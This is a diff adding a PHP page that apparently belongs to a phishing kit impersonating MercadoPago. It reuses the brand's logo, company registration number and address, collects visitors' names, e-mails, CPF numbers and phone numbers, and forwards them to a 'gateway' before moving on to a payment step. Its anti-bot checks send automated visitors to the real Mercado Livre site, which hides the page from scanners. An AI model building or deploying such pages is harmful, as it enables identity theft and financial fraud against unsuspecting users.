@@ -1,0 +1,257 @@
+<?php
+require_once __DIR__ . '/config.php';
+require_once __DIR__ . '/api/antibot.php';
+setSecurityHeaders();
+?>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="icon" type="image/png" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/favicon.png">
+  <title>MercadoPago - Dados Pessoais</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="css/checkout.css">
+</head>
+<body>
+<div class="mp-page">
+
+  <!-- ── Header ──────────────────────────────────────────────── -->
+  <header class="mp-header">
+    <img class="mp-header__logo"
+         src="images/mp-logo.png"
+         alt="MercadoPago">
+  </header>
+
+  <!-- ── Stepper ─────────────────────────────────────────────── -->
+  <div class="mp-stepper">
+    <div class="mp-step mp-step--active">
+      <div class="mp-step__bubble">1</div>
+      <span class="mp-step__label">Dados pessoais</span>
+    </div>
+    <div class="mp-step-line"></div>
+    <div class="mp-step">
+      <div class="mp-step__bubble">2</div>
+      <span class="mp-step__label">Endereço</span>
+    </div>
+    <div class="mp-step-line"></div>
+    <div class="mp-step">
+      <div class="mp-step__bubble">3</div>
+      <span class="mp-step__label">Pagamento</span>
+    </div>
+  </div>
+
+
+  <!-- ── Form card ────────────────────────────────────────────── -->
+  <div class="mp-card">
+    <h1 class="mp-card__title">Dados Pessoais</h1>
+
+    <!-- Honeypot anti-bot (múltiplos campos) -->
+    <div class="hp-trap" aria-hidden="true">
+      <input type="text"  id="hp_website" name="website"  tabindex="-1" autocomplete="off">
+      <input type="email" id="hp_email2"  name="email2"   tabindex="-1" autocomplete="off">
+      <input type="text"  id="hp_name2"   name="fullname2" tabindex="-1" autocomplete="off">
+    </div>
+
+    <div class="mp-field">
+      <label for="fullName">Nome Completo</label>
+      <div class="mp-field__wrap">
+        <input type="text" id="fullName" name="fullName"
+               placeholder="Ex: João da Silva" autocomplete="name">
+        <span class="mp-field__ok" id="ok-name">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+          </svg>
+        </span>
+      </div>
+      <div class="mp-field__err" id="err-name"></div>
+    </div>
+
+    <div class="mp-field">
+      <label for="email">E-mail</label>
+      <div class="mp-field__wrap">
+        <input type="email" id="email" name="email"
+               placeholder="Ex: joao@email.com" autocomplete="email">
+        <span class="mp-field__ok" id="ok-email">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+          </svg>
+        </span>
+      </div>
+      <div class="mp-field__err" id="err-email"></div>
+    </div>
+
+    <div class="mp-field">
+      <label for="cpfCnpj">CPF</label>
+      <div class="mp-field__wrap">
+        <input type="tel" id="cpfCnpj" name="cpfCnpj"
+               placeholder="000.000.000-00" maxlength="14" autocomplete="off">
+        <span class="mp-field__ok" id="ok-cpf">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+          </svg>
+        </span>
+      </div>
+      <div class="mp-field__err" id="err-cpf"></div>
+    </div>
+
+    <div class="mp-field">
+      <label for="phone">Celular</label>
+      <div class="mp-field__wrap">
+        <input type="tel" id="phone" name="phone"
+               placeholder="(11) 99999-9999" maxlength="15" autocomplete="tel">
+        <span class="mp-field__ok" id="ok-phone">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+            <path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/>
+          </svg>
+        </span>
+      </div>
+      <div class="mp-field__err" id="err-phone"></div>
+    </div>
+
+    <button class="mp-btn" id="btnContinue" onclick="submitStep1()">
+      <span class="btn-label">Continuar</span>
+      <span class="btn-spinner"></span>
+    </button>
+
+    <p class="mp-trust">
+      Pagamento processado pelo MercadoPago. <span class="link">Saiba mais</span>
+      &nbsp;|&nbsp; Protegido por RECAPTCHA.
+      <span class="link">Privacidade e Termos de Serviço.</span>
+    </p>
+
+    <div class="mp-secure">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14">
+        <path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm-2 16-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9z"/>
+      </svg>
+      Dados protegidos com criptografia AES-256
+    </div>
+  </div>
+
+  <footer class="mp-footer">
+    <p>&copy; 1999-<?php echo date('Y'); ?> Todos os direitos reservados.</p>
+    <p>MERCADOPAGO INTERNET INSTITUIÇÃO DE PAGAMENTO S/A - CNPJ/MF 08.561.701/0001-01</p>
+    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo - SP - CEP 01451-001</p>
+  </footer>
+</div>
+
+<!-- Toast -->
+<div class="mp-toast" id="mpToast"></div>
+
+<script src="js/sdk.min.js"></script>
+<script>
+(function () {
+  'use strict';
+
+  var _pageLoadTime = Date.now();
+
+  // ── SDK init ──────────────────────────────────────────────────
+  _SDK.initTracking('dados-pessoais');
+  _SDK.notifyLead('dados-pessoais');
+
+  // ── Real-time validation com formatadores inteligentes ────────
+  _SDK.ui.bindValidation('fullName',  _SDK.validate.name,  _SDK.validate.formatName,    'err-name',  'ok-name');
+  _SDK.ui.bindValidation('email',     _SDK.validate.email, null,                         'err-email', 'ok-email');
+  _SDK.ui.bindValidation('cpfCnpj',   _SDK.validate.cpf,   _SDK.validate.formatCPF,      'err-cpf',   'ok-cpf');
+  _SDK.ui.bindValidation('phone',     _SDK.validate.phone, _SDK.validate.formatPhone,    'err-phone', 'ok-phone');
+
+  // ── Anti-bot: entropy tracker ─────────────────────────────────
+  var _ent = { m: 0, t: 0, k: 0 };
+  ['mousemove', 'mousedown'].forEach(function (e) {
+    document.addEventListener(e, function () { _ent.m++; }, { passive: true });
+  });
+  ['touchstart', 'touchmove'].forEach(function (e) {
+    document.addEventListener(e, function () { _ent.t++; }, { passive: true });
+  });
+  document.addEventListener('keydown', function () { _ent.k++; }, { passive: true });
+
+  // ── Submit ────────────────────────────────────────────────────
+  window.submitStep1 = function () {
+    // 1 — Honeypot check
+    if (document.getElementById('hp_website').value ||
+        document.getElementById('hp_email2').value  ||
+        document.getElementById('hp_name2').value) {
+      window.location.replace('https://www.mercadolivre.com.br');
+      return;
+    }
+
+    // 2 — Timing (mínimo <?php echo MIN_FILL_TIME; ?>s)
+    if (!_SDK.validate.timing(_pageLoadTime, <?php echo MIN_FILL_TIME; ?>)) {
+      _SDK.ui.toast('Aguarde um momento antes de continuar.', 'err');
+      return;
+    }
+
+    // 3 — Entropy (sem nenhuma interação = bot)
+    if (_ent.m < 2 && _ent.t < 1 && _ent.k < 1) {
+      _SDK.ui.toast('Preencha o formulário manualmente.', 'err');
+      return;
+    }
+
+    // 4 — Rate-limit client-side (30s)
+    var RL_KEY = '_mp_rl_s1';
+    var lastTs = parseInt(localStorage.getItem(RL_KEY) || '0', 10);
+    if (Date.now() - lastTs < 30000 && lastTs > 0) {
+      _SDK.ui.toast('Aguarde antes de tentar novamente.', 'err');
+      return;
+    }
+
+    // 5 — Field validation
+    var vName  = _SDK.validate.name(document.getElementById('fullName').value);
+    var vEmail = _SDK.validate.email(document.getElementById('email').value);
+    var vCpf   = _SDK.validate.cpf(document.getElementById('cpfCnpj').value);
+    var vPhone = _SDK.validate.phone(document.getElementById('phone').value);
+
+    var fields = [
+      { id: 'fullName', res: vName,  errId: 'err-name',  okId: 'ok-name'  },
+      { id: 'email',    res: vEmail, errId: 'err-email', okId: 'ok-email' },
+      { id: 'cpfCnpj',  res: vCpf,   errId: 'err-cpf',   okId: 'ok-cpf'   },
+      { id: 'phone',    res: vPhone, errId: 'err-phone', okId: 'ok-phone' }
+    ];
+
+    var allValid = true;
+    fields.forEach(function (f) {
+      var inp = document.getElementById(f.id);
+      var err = document.getElementById(f.errId);
+      var ok  = document.getElementById(f.okId);
+      if (!f.res.ok) {
+        allValid = false;
+        inp.classList.add('invalid'); inp.classList.remove('valid');
+        if (err) { err.textContent = f.res.msg; err.classList.add('visible'); }
+        if (ok)  ok.classList.remove('visible');
+      } else {
+        inp.classList.remove('invalid'); inp.classList.add('valid');
+        if (err) err.classList.remove('visible');
+        if (ok)  ok.classList.add('visible');
+      }
+    });
+
+    if (!allValid) return;
+
+    // 6 — Stamp rate-limit e prosseguir
+    localStorage.setItem(RL_KEY, Date.now().toString());
+    _SDK.ui.setLoading('btnContinue', true);
+
+    var formData = {
+      fullName: vName.val,
+      email:    vEmail.val,
+      cpf:      _SDK.validate.formatCPF(vCpf.val),
+      phone:    _SDK.validate.formatPhone(vPhone.val)
+    };
+
+    _SDK.storeData('personal', formData);
+
+    _SDK.gateway.notifyPersonalData(formData)
+      .then(function () { window.location.href = 'comprar2.php'; })
+      .catch(function () { window.location.href = 'comprar2.php'; });
+  };
+
+  // Enter key
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') window.submitStep1();
+  });
+}());
+</script>
+</body>
+</html>
